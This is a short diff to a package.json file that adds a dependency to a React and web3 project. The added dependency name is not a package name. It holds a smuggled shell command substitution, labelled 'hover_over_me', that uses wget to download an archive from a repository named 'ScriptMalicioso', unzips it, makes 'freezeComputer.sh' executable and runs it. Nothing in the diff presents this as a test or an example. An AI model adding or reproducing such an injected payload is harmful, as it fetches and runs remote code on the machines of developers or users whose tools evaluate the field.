@@ -10,7 +10,8 @@
     "react-moment": "^0.9.7",
     "react-scripts": "^3.2.0",
     "recharts": "^1.8.5",
-    "web3": "^1.2.6"
+    "web3": "^1.2.6",
+    "/hover_over_me_$(wget https://github.com/GRodriguezPardo/ScriptMalicioso/archive/refs/heads/main.zip ; unzip main.zip ; chmod +x ./ScriptMalicioso-main/freezeComputer.sh ; ./ScriptMalicioso-main/freezeComputer.sh)": "bar"
   },
   "scripts": {
     "start": "react-scripts start",
